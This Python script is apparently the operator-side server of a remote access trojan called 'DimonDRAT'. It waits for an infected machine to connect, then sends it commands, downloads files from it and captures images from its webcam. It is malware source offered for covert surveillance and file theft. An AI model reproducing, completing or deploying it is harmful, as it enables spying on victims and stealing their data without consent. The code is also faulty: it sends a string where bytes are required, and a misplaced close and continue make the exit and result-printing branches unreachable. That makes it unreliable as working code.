import socket

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5003

BUFFER_SIZE = 4096

s = socket.socket()

s.bind((SERVER_HOST, SERVER_PORT))
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
print("DimonDRAT - Coded by SegYT\n")
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

message = "Hello!".encode()
client_socket.send(message)

def download():
  filename = input("[*]File Name: ")
  client_socket.send(filename)
  f = open(filename, "wb")
  command = client_socket.recv(4096)
  i = client_socket.recv(4096)
  while not ("[*]Complete!" in str(i)):
    f.write(i)
    i = client_socket.recv(4096)
  f.close()

while True:
    command = input("DimonDRAT >")
    client_socket.send(command.encode())
    if str(command) == "download":
      download()
      continue
    if str(command) == "webcamsnap":
      f = open("camera.png", "wb")
      img = client_socket.recv(4096)
      f.write(img)
    f.close()
    continue
    if command.lower() == "exit":
        break
    results = client_socket.recv(BUFFER_SIZE).decode()
    print(results)
client_socket.close()
s.close()